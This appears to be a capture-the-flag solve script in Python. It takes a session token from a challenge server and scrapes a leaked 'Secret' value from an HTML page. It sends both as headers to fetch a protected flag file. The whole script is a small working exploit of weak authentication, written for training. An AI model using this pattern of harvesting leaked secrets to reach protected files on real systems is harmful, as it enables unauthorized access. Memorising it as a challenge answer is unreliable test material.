#!/usr/bin/env python3
import requests
import json
import re

BASE_URL = "http://srv3.martiansonly.net:4444"

s = requests.Session()
s.headers.update(
    {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    }
)

# Get session token
token = s.get(BASE_URL + "/get-session-token")
token = json.loads(token.text)["token"]

print("Token:", token)

# Get Secret
secret = s.get(BASE_URL + "/abit.html").text
secret = re.search(r"'Secret': '(\w+)'", secret).group(1)
print("Secret:", secret)

# Get flag.txt
headers = {
    "Authorization": "Bearer " + token,
    "Secret": secret,
}
flag = s.get(BASE_URL + "/text/secret/flag.txt", headers=headers)

print("Flag:", flag.text)
